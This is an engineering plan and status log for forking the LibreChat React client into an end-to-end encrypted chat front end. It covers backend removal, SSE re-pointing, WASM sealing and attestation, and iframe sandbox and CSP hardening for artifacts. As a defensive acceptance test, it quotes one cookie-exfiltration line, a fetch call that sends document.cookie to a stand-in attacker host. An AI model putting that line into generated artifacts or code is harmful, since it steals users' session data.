# Caladon Web Client — LibreChat Surgery Map

**Stage:** SURGERY LANDED (React wiring pass). The §A/§B/§C/§D edits are now applied to the
vendored tree and exported as a committable overlay (`web-client/overlay/`, applied by
`web-client/apply-overlay.sh`). See the **DONE STATUS** section at the bottom for what builds,
what's wired, what's partial, and the deviations. Full surgery is multi-session — this doc is the
file-level operating plan the surgery follows.

**Vendored upstream (pinned):**
- repo: `https://github.com/danny-avila/LibreChat`
- version: `v0.8.6`
- commit: `d680763db3e5ec8e100c824a9b8f6189ab0081cd` (2026-06-02)
- location: `web-client/librechat/` — **git-ignored**, NOT committed (re-clone via `web-client/setup.sh`).

Line numbers below are pinned to that commit. Re-confirm after any `setup.sh` re-clone (upstream
moves fast; `setup.sh` pins `--depth 1` of `main`, so bump the commit here when it drifts).

---

## 0. The thesis (why a fork, not a from-scratch build)

LibreChat already ships the hard, boring 80%: a polished React chat surface, a battle-tested SSE
streaming pipeline, markdown/code/artifact rendering, conversation list UX, model picker, file
attach UI, i18n, a11y. We **keep the presentation layer** and **amputate the entire trust-bearing
backend**: its Mongo persistence, its server-side LLM/agents orchestration, and its Passport
identity. In their place the client talks to **`gw.caladon.ai`** — the Caladon ciphertext-router
gateway (see `/contracts/gateway-api.md`) — through a thin, stateless Hono proxy shim that holds
**no DB and no keys**. All crypto (seal/open/seed-auth/session/attestation) runs **client-side in
the `caladon-core` WASM** (P3 deliverable), so the shim and the gateway only ever route opaque
envelopes. The browser is the only place plaintext exists.

Trust model in one line: **the React app is the client; the gateway is the only server; the shim is
a dumb CORS-and-cookie relay; nothing in between sees plaintext or a key.**

Three surgical verbs:
- **(A) RIP OUT / REPLACE** — Mongo models, server-side LLM/agents, Passport auth.
- **(B) KEEP** — React chat UI + the SSE event pipeline (re-pointed, payloads become envelopes).
- **(C) LOCK DOWN** — Artifacts/Sandpack renderer (untrusted model HTML must not exfiltrate).
- **(D) INJECT** — `caladon-core` WASM (seal/open/seed-auth/attestation) + routing to the shim.

---

## A. RIP OUT / REPLACE — the trust-bearing backend

The whole point of the fork is that **none of this backend runs in Caladon.** The shim
(`web-client/shim/`) replaces it; the gateway + per-tenant CVM are the real backend. Treat the
entire `api/` Express app and the Mongo layer as **dead code we do not deploy** — we delete it in a
later session, but for the SCAFFOLD stage it is enough to (a) stop building it and (b) re-point the
frontend's data layer (see §D) so nothing calls it.

### A1. Mongo conversation/message/persistence models — DELETE
All persistence is client-side ratcheted ciphertext on the Caladon side; the server stores only
opaque envelopes (`/contracts/identity-envelope.md §5.1`). Every model below is **removed**:

| Path | What it is | Action |
|---|---|---|
| `packages/data-schemas/src/schema/convo.ts` | conversation Mongoose schema | DELETE |
| `packages/data-schemas/src/schema/message.ts` | message Mongoose schema | DELETE |
| `packages/data-schemas/src/schema/session.ts` | server login-session schema | DELETE |
| `packages/data-schemas/src/schema/user.ts` | user/PII schema | DELETE |
| `packages/data-schemas/src/schema/key.ts`, `token.ts`, `pluginAuth.ts` | provider API keys, refresh tokens, plugin secrets | DELETE (we hold NO keys) |
| `packages/data-schemas/src/schema/*` (all 30 remaining) | agents, balance, transaction, share, prompt, memory, file, role, acl… | DELETE — none have a home in a zero-state shim |
| `packages/data-schemas/src/models/*` (mirror of the above) | model factories | DELETE |
| `api/db/connect.js`, `api/db/indexSync.js`, `api/db/models.js`, `api/db/index.js` | the MongoDB connection + index sync | DELETE — no Mongo, ever |
| `api/models/index.js` | re-exports the model layer | DELETE |

Net effect: **the shim has no database.** Conversation history lives as envelopes the gateway
returns from `GET /v1/messages` and the client decrypts; nothing is persisted server-side.

### A2. Server-side LLM / agents orchestration path — DELETE
LibreChat runs the model server-side (it holds provider keys, builds the prompt, streams from
OpenAI/Anthropic/etc.). Caladon does the opposite: the **prompt is sealed in the browser**, the
gateway forwards the envelope, the **attested CVM** runs inference. So the entire server inference
stack is amputated:

| Path | What it is | Action |
|---|---|---|
| `api/server/routes/agents/chat.js` | the agents chat endpoint (`POST /api/agents/chat`) — the primary server LLM entry | DELETE (replaced by shim → `gw/v1/chat`) |
| `api/server/routes/agents/{openai,responses,tools,actions,v1,middleware}.js` | agent run plumbing | DELETE |
| `api/server/routes/{assistants,messages,convos,endpoints,models,presets,keys,balance,search}.js` | server-rendered chat/persistence/provider routes | DELETE |
| `api/server/services/Endpoints/**` | per-provider client builders (OpenAI, Anthropic, Google, Bedrock, Azure…) | DELETE — providers are reached only inside the CVM |
| `api/server/services/Runs/**`, `Threads/**`, `Tools/**`, `ToolService.js`, `ActionService.js`, `MCP.js`, `initializeMCPs.js` | agent run/tool/MCP orchestration | DELETE |
| `api/server/services/AuthService.js`, `twoFactorService.js`, `PermissionService.js` | server auth/permission logic | DELETE (see A3) |
| `@librechat/agents` dependency | the agent engine (server-side) | REMOVE from `api/package.json` (not installed) |
| `api/server/controllers/agents/**` | request controllers feeding the SSE | DELETE |

The **client** keeps its idea of "a model" only as a slug it passes to the gateway
(`POST /v1/chat` body field `model`, honoured only if attested — `routes/chat.py:138`,
`deps.py:get_inference`). The model picker UI (§B) survives; its options come from the gateway's
attested catalog (`GET /v1/models`), proxied by the shim.

### A3. Passport / OAuth / JWT auth — DELETE, replace with seed-signature auth
LibreChat identity is Passport (local + 8 social strategies) + JWT bearer + refresh cookies +
Mongo `user`/`session`/`token`. Caladon identity is **a key derived from a local seed**: the client
signs every request `Authorization: Caladon acct=<id> ts=<unix> sig=<Ed25519(...)>`
(`/contracts/gateway-api.md §1`; signer = `caladon-core::seed_auth::authorization_header`,
`caladon-core/src/seed_auth.rs:51`). There is no password, no email, no server-side user record.

| Path | What it is | Action |
|---|---|---|
| `api/strategies/*` (all 18: apple, google, github, facebook, discord, ldap, saml, openid, local, jwt…) | Passport strategies | DELETE |
| `api/server/routes/auth.js`, `oauth.js`, `user.js` | login/register/refresh/2fa/oauth routes | DELETE |
| `client/src/components/Auth/**` (Login, Registration, social buttons, password reset, 2FA) | auth UI | REPLACE with a **seed unlock** screen (enter/restore seed phrase → derive keys in WASM → never leaves the device). Stub in SCAFFOLD; build in the auth session. |
| `client/src/hooks/AuthContext.tsx` | holds the JWT `token`, drives refresh | REWRITE: instead of a bearer JWT it exposes (i) the unlocked seed-derived identity and (ii) a `signRequest(method, path)` that calls the WASM. `useSSE` reads `token` here today (`useSSE.ts:26`) — it becomes a per-request signed `Authorization` header instead. |
| `packages/data-provider/src/request.ts` (interceptor lines 64-157) | the 401→refresh-token bearer flow | REWRITE: drop the refresh dance; on 401 re-sign (clock skew) or surface "re-unlock seed". `setTokenHeader` / `Bearer ${token}` semantics removed. |

Replacement auth contract is already FROZEN and LIVE — verified this session:
`GET /health` → 200 (open); every `/v1/*` → **401 without a valid `Caladon` signature**. The shim
forwards the header verbatim; the gateway is the verifier (`gateway/app/deps.py:require_account`).

---

## B. KEEP — the React chat UI + SSE pipeline (re-point, don't rewrite)

This is the asset we forked for. **Keep the components; change only where the bytes come from and
that the payloads are now envelopes.**

### B1. Components to KEEP as-is (presentation only, no trust)
- `client/src/components/Chat/**` — the chat surface (message list, composer, scroll, stop button).
- `client/src/components/Messages/**` — message bubbles, markdown, code blocks, citations.
- `client/src/components/Input/**` — composer, attach, model/preset selectors (options re-sourced).
- `client/src/components/Conversations/**`, `Nav/**`, `UnifiedSidebar/**` — the conversation list
  (now backed by decrypted-envelope history, not Mongo convos).
- `client/src/components/ui/**` — design system (untouched).
- i18n (`client/src/locales/**`), a11y (`client/src/a11y/**`) — untouched.

### B2. The SSE pipeline — KEEP the machinery, re-point + decrypt
This is the single most valuable piece. The mapping is near-1:1 with the gateway's SSE contract
(`/contracts/gateway-api.md §3`: `event: token | reasoning | receipt | done | error`).

| Path | Role | Surgery |
|---|---|---|
| `client/src/hooks/SSE/useSSE.ts` | opens the stream (`new SSE(...)`, line 78), wires event listeners | **RE-POINT + DECRYPT.** `payloadData.server` (line 78) must become the shim's `/api/caladon/chat`. The `Authorization: Bearer ${token}` header (line 80) becomes the `Caladon …` signed header (§A3). Each `token`/`reasoning` event's `e.data` is an **envelope** → call `caladon_core.open_chat(...)` (WASM, §D) before handing the plaintext delta to `messageHandler`/`contentHandler`. A new `receipt` listener verifies the per-response attestation (§D3). |
| `client/src/hooks/SSE/useEventHandlers.ts` | `messageHandler`, `contentHandler`, `finalHandler`, `errorHandler`, `createdHandler` | KEEP. They operate on plaintext deltas — feed them the **decrypted** text. `finalHandler`'s server-persistence assumptions (it expects a Mongo-saved final message) are softened: the final message is just the assembled decrypted stream. |
| `client/src/hooks/SSE/useContentHandler.ts`, `useStepHandler.ts`, `useAttachmentHandler.ts` | content-part assembly | KEEP (operate post-decrypt). |
| `client/src/hooks/SSE/{useResumableSSE,useAdaptiveSSE,useResumeOnLoad}.ts` | resumable-stream support | KEEP if the gateway supports resume; otherwise leave inert. Not load-bearing for the SCAFFOLD round-trip. |
| `packages/data-provider/src/createPayload.ts` | builds `{ server, payload }` from a submission; `server` derives from `EndpointURLs` (`config.ts:1698`) | **REWRITE.** `server` → shim `/api/caladon/chat`. `payload` → `{ envelope: <sealed prompt>, model: <slug> }` (matches `routes/chat.py::ChatRequest`). The prompt is sealed via `caladon_core.seal_chat(...)` (WASM) **before** it reaches here. |
| `packages/data-provider/src/config.ts:1698` `EndpointURLs` | maps endpoint→server URL | REWRITE: collapse all endpoints to the single Caladon chat route. |

**Net SSE flow after surgery:** composer → WASM `seal_chat(prompt)` → `createPayload` builds
`{envelope, model}` → `useSSE` POSTs to shim `/api/caladon/chat` with a signed header → shim relays
to `gw/v1/chat` → gateway streams sealed `token` envelopes back → shim relays SSE verbatim → `useSSE`
WASM-`open_chat`s each delta → existing handlers render plaintext. **The gateway and shim never see
plaintext.**

### B3. The data layer — re-point reads
- `packages/data-provider/src/api-endpoints.ts` — the URL builder (40+ endpoints). For the chat
  target, only three survive and are re-pointed at the shim: `messages` (→ `/api/caladon/messages`),
  a chat opener (→ `/api/caladon/chat`), and attestation (→ `/api/caladon/attestation`). Everything
  else (convos, presets, keys, balance, prompts, files, agents, mcp, roles, permissions…) points at
  routes that **no longer exist** — they are removed or stubbed to empty as the matching UI is cut.
- `packages/data-provider/src/data-service.ts` — the typed call layer over `request.ts`. The message
  list (`getMessagesByConvoId`-equivalent) is re-pointed; its response is now **an array of envelopes**
  the client decrypts (matches `routes/messages.py` → `store.list` opaque envelopes).
- `client/src/data-provider/Messages/**`, `client/src/data-provider/Conversations/**` — React-Query
  hooks. KEEP the hook shape; the query functions decrypt envelopes after fetch.

---

## C. LOCK DOWN — the Artifacts / Sandpack renderer (untrusted model HTML)

**Threat:** the model can emit an HTML/React artifact that the renderer executes in an iframe. In a
privacy product this is a **plaintext-exfiltration channel**: artifact JS could `fetch()` the
conversation or beacon it out. We render artifacts but **deny them the network and same-origin
access**. Two enforcement layers (defence in depth):

### C1. iframe `sandbox` — `allow-scripts` ONLY (NEVER `allow-same-origin`)
Sandpack renders into an iframe via `<SandpackPreview>`.
- `client/src/components/Artifacts/ArtifactPreview.tsx:58` — the `<SandpackPreview>` element. We must
  force the preview iframe's `sandbox` attribute to exactly **`allow-scripts`**. Critically we
  **omit `allow-same-origin`**: with `allow-scripts` but without `allow-same-origin`, the iframe runs
  in an opaque origin, so it cannot read cookies, `localStorage`, IndexedDB, or the parent DOM, and
  any `fetch` to our origin is cross-origin and credential-less. (Sandpack does not expose a direct
  `sandbox` prop on `SandpackPreview`, so the surgery patches the rendered iframe — either a thin
  wrapper that sets `iframe.sandbox = 'allow-scripts'` on mount via the `previewRef`
  (`ArtifactPreview.tsx:62`), or a vendored Sandpack patch. **Never** allow `allow-same-origin` +
  `allow-scripts` together — that combination lets the frame remove its own sandbox.)

### C2. CSP `connect-src 'none'` — kill the network from inside the frame
Belt to C1's braces: inject a `<meta http-equiv="Content-Security-Policy">` into the artifact
document so even script that runs cannot open a socket.
- `client/src/utils/artifacts.ts:177` `sharedOptions.externalResources = [TAILWIND_CDN]` and
  `:895` `sharedFiles` (the injected `index.html`, with a `<script src="https://cdn.tailwindcss.com…">`
  at `:941`). The surgery:
  - Inject into the artifact `index.html` head: `<meta http-equiv="Content-Security-Policy"
    content="default-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'none'; ...">`.
    `connect-src 'none'` blocks `fetch`/`XHR`/`WebSocket`/`EventSource`/`sendBeacon` outright.
  - **Reconsider the Tailwind CDN** (`artifacts.ts:175` `TAILWIND_CDN`, `:178` `externalResources`,
    `:941` the `<script src>`): a remote `script-src` is itself a load + a beacon vector. Replace
    with a **self-hosted, vendored** Tailwind (served by the shim/static, same-origin) so
    `connect-src 'none'` + `script-src 'self'` is coherent. Decision recorded here; implemented in
    the artifacts session.
  - `bundlerURL` (`artifacts.ts:191`, fed from `startupConfig.bundlerURL`): point at a
    **self-hosted Sandpack bundler** (same-origin), not the public `*.codesandbox.io` bundler, so
    the toolchain itself is not a remote-fetch/exfil surface. Otherwise the bundler load competes
    with `connect-src 'none'`.
- `client/src/components/Artifacts/ArtifactCodeEditor.tsx`, `ArtifactTabs.tsx`, `Artifacts.tsx`,
  `client/src/hooks/Artifacts/useArtifactProps.ts` — KEEP (editor/tabs UI). Only the preview
  execution surface (C1/C2) is hardened.
- `client/src/components/Artifacts/Mermaid.tsx` — Mermaid renders SVG client-side (no iframe); lower
  risk, but audit for any `fetch`-on-render in the same pass.

**Acceptance for C:** an artifact containing `fetch('https://evil.example/'+document.cookie)` must
(a) have no cookie to read (opaque origin, C1) and (b) be blocked from connecting at all
(`connect-src 'none'`, C2). Add a Playwright test asserting both.

---

## D. INJECT — `caladon-core` WASM + routing to `gw.caladon.ai`

`caladon-core` (`/caladon-core/`) is the single crypto/attestation source of truth; it compiles to
**WASM** for this web fork (and a UniFFI xcframework for the native app). The WASM module is the
**only** place the web client does crypto. The functions it must export (today implemented in Rust,
parity-tested vs the Python reference; `wasm-bindgen` wrapper is the **P3 deliverable** —
`caladon-core/src/lib.rs:9` "P3: attestation (dcap-qvl) + wasm-bindgen + UniFFI"):

| WASM export (from caladon-core) | Rust source | Web client call site |
|---|---|---|
| `authorization_header(seed, acct, ts, method, path) -> "Caladon …"` | `src/seed_auth.rs:51` | every request: `AuthContext.signRequest()` (§A3), consumed by `useSSE.ts:80` + `request.ts` |
| `x25519_public(priv) -> pub` | `src/session.rs:43` | session handshake (ephemeral key for `POST /v1/session`) |
| `derive_session_key(my_priv, their_pub, client_pub, cvm_pub) -> SK` | `src/session.rs:57` | after attestation verify, derive SK to seal WMK + chat |
| `seal_chat(SK, plaintext, acct, v) -> (nonce, ct)` | `src/session.rs:163` | `createPayload.ts` — seal the prompt before POST `/v1/chat` |
| `open_chat(SK, nonce, ct, acct, v) -> plaintext` | `src/session.rs:173` | `useSSE.ts` token/reasoning handlers — decrypt each delta |
| `seal_wmk(SK, wmk, acct, v) -> (nonce, ct)` | `src/session.rs:111` | seal the working-memory key for `POST /v1/session` |
| envelope wire shape `{v, alg:"xchacha20poly1305", kid, nonce, aad, ct}` (all base64) | `src/envelope.rs` + `gateway/app/envelope.py:32` | the on-wire JSON for every sealed field |
| **attestation verify** (TDX quote → Intel PCS root, measurement pin, challenge binding) | **P3 — not yet built** (`lib.rs:9`); contract `/contracts/attestation-evidence.md §2.1` | pre-send: verify `GET /v1/attestation` evidence **fail-closed** before any seal/send |

### D1. Where the WASM is loaded
- New module `client/src/lib/caladon/` — loads the `wasm-bindgen` glue (`caladon_core_bg.wasm` +
  `caladon_core.js`), exposes a typed async TS facade matching the table above. Built by P3 and
  copied into `client/public/` (or imported via Vite's wasm support).
- `client/src/hooks/AuthContext.tsx` owns the unlocked seed and the WASM handle; everything else gets
  crypto through it (no raw key ever escapes this boundary).

### D2. Routing to `gw.caladon.ai` (via the shim)
The browser never talks to `gw.caladon.ai` directly (CORS + cookie hygiene). All gateway traffic
goes **browser → shim (`/api/caladon/*`) → `gw.caladon.ai`**:
- `useSSE.ts:78` `new SSE(server)` → `server = /api/caladon/chat` → shim → `gw/v1/chat`.
- message history fetch → `/api/caladon/messages` → shim → `gw/v1/messages`.
- attestation handshake → `/api/caladon/attestation?challenge=…` → shim → `gw/v1/attestation`.
- session establish → `/api/caladon/session` → shim → `gw/v1/session`.
- Intel PCS collateral for quote verification (browser can't reach Intel PCS directly — CORS) →
  shim `/pcs-collateral` → upstream PCS, CORS-fixed (see shim README).

### D3. The fail-closed handshake order (client orchestration the surgery must wire)
1. unlock seed → derive identity (`acct`, ed25519 signer, kem) in WASM.
2. `GET /api/caladon/attestation?challenge=SHA256(eph_pub)` → **verify evidence fail-closed in WASM
   (P3)**. Refuse to proceed on any failure (`attestation-evidence.md §4`, no TOFU).
3. `derive_session_key` against the attested `session_pub` → seal WMK → `POST /api/caladon/session`.
4. per turn: `seal_chat(prompt)` → `POST /api/caladon/chat` → stream sealed deltas → `open_chat`.
5. per `receipt` SSE event: re-verify the per-response attestation; on mismatch drop + mark session
   untrusted + stop (`attestation-evidence.md §3`).

---

## BLOCKED ON P3 (WASM)

The SCAFFOLD + SHIM stage delivers the foundation and proves a **plaintext-first** round-trip
(shim ↔ live gateway, no crypto). The confidential path is gated on these P3 deliverables:
1. **`wasm-bindgen` build of `caladon-core`** exporting the §D table. Until then there is no
   client-side seal/open/sign, so the path runs in plaintext-debug only.
2. **`attestation` module (dcap-qvl)** — `caladon-core/src/lib.rs:9` marks this P3. Without it the
   client cannot verify `GET /v1/attestation` fail-closed, so step D3.2 cannot gate the channel.
3. **Self-hosted Sandpack bundler + vendored Tailwind** (C2) — infra, not WASM, but required before
   artifacts can be enabled with `connect-src 'none'` coherently.

Everything in §A/§B/§C is editable today against the vendored tree; the crypto **inject points**
(§D) are stubbed until the WASM lands.

> **UPDATE (this pass):** the WASM has since landed — `wasm-bindgen` build at
> `web-client/caladon/wasm/` (P3.1 done) AND the dcap-qvl attestation verify is exported
> (`verify_quote_sync`, P3.2 done). The committable, tested `@caladon/protocol` SDK
> (`web-client/caladon/`) wraps both. So §D is now **wired for real**, not stubbed (see DONE
> STATUS). Only the §C2 infra (self-hosted Sandpack bundler + vendored Tailwind binary) remains a
> deploy-time provision.

---

## DONE STATUS — React wiring pass (this session)

**Where the edits live.** The vendored `web-client/librechat/` tree is git-ignored. Every
changed/added file is exported as an OVERLAY at `web-client/overlay/<same-relative-path>` and
re-applied by `web-client/apply-overlay.sh` (clone pinned upstream → copy overlay). 17 files:

| Overlay file | Surgery | Section |
|---|---|---|
| `client/src/lib/caladon/index.ts` *(new)* | the INJECT module — singleton `CaladonClient` + WASM facade (unlock/handshake, `signRequest`, `sealChat`, `openDelta`) | §D, §D1 |
| `client/src/hooks/AuthContext.tsx` | rewritten: seed-derived identity + fail-closed handshake; JWT/refresh/Passport amputated; `caladon.{unlock,lock,signRequest}` exposed; legacy `token/login/logout` shape kept (60+ call sites) | §A3, §D1 |
| `client/src/common/types.ts` | `TAuthContext` extended with the optional `caladon` identity surface | §A3 |
| `client/src/hooks/SSE/useSSE.ts` | rewritten effect: fail-closed gate → `sealChat` → signed `Caladon` header → POST shim `/api/caladon/chat` → `token`/`reasoning` deltas opened via `openDelta` before the existing handlers; `done`/`receipt` listeners added; 401 re-signs (no refresh dance) | §B2, §D3.4, §D3.5 |
| `packages/data-provider/src/createPayload.ts` | `server` collapses to the single shim chat route; payload sealed at the SSE call site into `{envelope, model}` | §B2, §D |
| `packages/data-provider/src/config.ts` | `EndpointURLs` collapsed: every endpoint → `/api/caladon/chat` | §B2, §A2 |
| `packages/data-provider/src/request.ts` | axios 401→refresh-token bearer flow ripped out; interceptor rejects (re-sign / re-unlock); `refreshToken`/`dispatchTokenUpdatedEvent` left as inert stubs | §A3 |
| `client/src/components/Artifacts/ArtifactPreview.tsx` | preview iframe forced to `sandbox="allow-scripts"` (NO `allow-same-origin`) via a MutationObserver on the Sandpack container | §C1 |
| `client/src/utils/artifacts.ts` | CSP `connect-src 'none'` meta injected into the artifact `index.html`; Tailwind CDN → self-hosted `/artifacts/tailwind.js`; bundler defaults to self-hosted `/sandpack-bundler/` | §C2 |
| `client/vite.config.ts` | `@caladon/protocol` (+ `/wasm`) alias to `web-client/caladon`; `server.fs.allow` for the external SDK; dev proxy `/api/caladon` + `/pcs-collateral` → shim (`CALADON_SHIM_URL`, default `:8787`) | §D1, §D2 |
| `client/tsconfig.json` | `@caladon/protocol` path mappings | §D1 |
| `client/src/vite-env.d.ts` | `VITE_CALADON_{PINNED,ATTESTATION,SHIM_BASE}` env types | §D |
| `client/src/components/Auth/CaladonUnlock.tsx` *(new)* | the **seed-unlock screen** (gap G2): Create new identity (`crypto.getRandomValues(32)` → recovery code = lowercase-hex of the 32 bytes, grouped, with a "I saved it" confirm) / Restore from recovery code (textarea → decode to exactly 32 bytes, validate length) → both call `caladon.unlock(bytes)`; loading state during the handshake; FAIL-CLOSED error state (catches `AttestationFailedError`/any handshake error → "Could not establish a verified session — refusing to connect" + retry). Uses LibreChat primitives (`Button`/`Spinner`/`ErrorMessage`). | §A3, §D3 |
| `client/src/routes/index.tsx` *(new)* | **route override**: `/login` renders `<CaladonUnlock/>` instead of `<Login/>` (password import dropped). Unlocked-guard needs no new code — identity is in-memory so `isAuthenticated` starts false on every load; `ChatRoute`'s `useAuthRedirect()` sends locked users to `/login`, `Root` renders nothing until unlocked, and AuthContext lock/logout already navigate to `/login`. | §A3 |
| `client/src/hooks/SSE/useAdaptiveSSE.ts` *(new)* | FORCE the sealed+signed `useSSE` for every chat turn; the resumable path is hard-disabled. Upstream `useAdaptiveSSE` routes non-assistant endpoints to `useResumableSSE`, whose `startGeneration` POSTs the prompt **plaintext + unsigned** (→ gateway 401 + a leak). Drives `useSSE(submission)` + `useResumableSSE(null)`. | §B2, §D4 |
| `client/src/hooks/SSE/useResumableSSE.ts` *(new)* | **no-op stub** — the resumable/`startGeneration`/`subscribe` plaintext code is physically removed (tree-shaken out of the bundle). The trust model forbids any unsealed/unsigned chat path. | §B2, §D4 |
| `client/src/hooks/SSE/useResumeOnLoad.ts` *(new)* | **no-op stub** — never polls stream status nor writes the shared submission atom, so the only non-empty submission comes from a composer send (→ sealed `useSSE`). | §B2, §D4 |

**What's WIRED (real, not stubbed):**
- **§A (RIP OUT):** Passport/JWT/refresh amputated from AuthContext + request.ts; server LLM/agents
  routes amputated by collapsing `EndpointURLs`/`createPayload` to the single shim opener; the
  `api/` Express + Mongo layer is dead code we do not build (frontend never calls it).
- **§B (KEEP + re-point):** the SSE machinery + all event handlers are kept; only the source bytes
  (shim route + envelopes) and the auth header changed. `messageHandler`/`contentHandler` run on
  the **decrypted** delta.
- **§C (LOCK DOWN):** iframe `sandbox=allow-scripts` (no same-origin) + CSP `connect-src 'none'`
  are in place; self-hosted bundler/Tailwind paths are wired (binaries are a deploy provision).
- **§D (INJECT):** the full fail-closed handshake (unlock → onboard → attest → **verify
  fail-closed** → derive SK → deliver WMK) runs through the live `@caladon/protocol` SDK + WASM;
  per-turn `seal_chat`/`open_chat` are wired into `useSSE`; per-request `Caladon` signing is wired
  into AuthContext + useSSE. Attestation policy + pinned set are deploy env (`VITE_CALADON_*`),
  defaulting to `strict` (no TOFU).

**What BUILDS (observed):**
- `web-client/caladon` (`@caladon/protocol`): `npm run typecheck` → clean; WASM binary present.
- `packages/data-provider`: `npm run build:data-provider` → green WITH the surgery edits.
- `packages/data-schemas`, `@librechat/api`: build green.
- See the build notes for the SPA (`client`) status + the host memory constraint hit this pass.

**Deviations from the plan:**
1. **`createPayload` seals at the SSE call site, not inside `createPayload`.** SURGERY.md §B2 asks
   `createPayload` to emit `{envelope, model}`. But sealing is async (WASM) and `createPayload` is
   synchronous + called in many render paths. The seal therefore lives in `useSSE` immediately
   before `new SSE(...)`; `createPayload` re-points `server` and passes the LibreChat payload
   through (the composer/edit/regenerate logic is untouched). Wire body is still `{envelope, model}`.
2. **AuthContext keeps the legacy `token/login/logout` shape** (re-pointed to no-ops / seed unlock)
   rather than deleting it, because ~60 call sites read `useAuthContext()`. `login()` surfaces "use
   your seed". **RESOLVED (gap G2):** the seed-unlock UI now exists — `CaladonUnlock.tsx` renders at
   `/login` (route override in `routes/index.tsx`) and calls `caladon.unlock(seed)`. The recovery
   code is the lowercase hex of the 32 seed bytes (the UI owns encode/decode — there is no mnemonic
   codec in the SDK). `<Login/>`, `LoginForm` and the social buttons are no longer reached.
3. **Mongo/Express/Passport files were NOT physically deleted** (§A says "delete in a later
   session"). They are amputated by re-pointing the frontend data layer so nothing reaches them and
   by not building `api/`. Physical deletion is a separate cleanup pass.
4. **§C2 self-hosted bundler + vendored Tailwind binaries** are wired by path
   (`/sandpack-bundler/`, `/artifacts/tailwind.js`) but the assets themselves must be provisioned
   at deploy (served same-origin by the shim/static). The Playwright exfil test (§C acceptance) is
   not added in this pass.
5. **Per-response `receipt` re-verification (§D3.5)** has the listener in place but the re-verify
   body is a P3-follow TODO; the handshake already gates the channel fail-closed.
